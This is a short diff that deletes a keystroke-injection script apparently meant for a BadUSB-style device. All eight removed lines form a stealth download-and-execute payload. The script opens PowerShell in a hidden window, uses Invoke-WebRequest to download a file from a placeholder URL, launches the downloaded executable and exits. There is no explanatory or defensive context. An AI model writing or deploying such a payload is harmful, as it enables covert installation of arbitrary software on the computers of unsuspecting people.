@@ -1,8 +1,0 @@
-Delay 1000
-RunWin powershell -windowstyle hidden
-Delay 3000
-PrintLine $source = "File URL "; $destination = "Path\FileName"; Invoke-WebRequest $source -OutFile $destination;
-Delay 2000
-PrintLine start-process FileName.EXE
-Delay 2000
-PrintLine exit
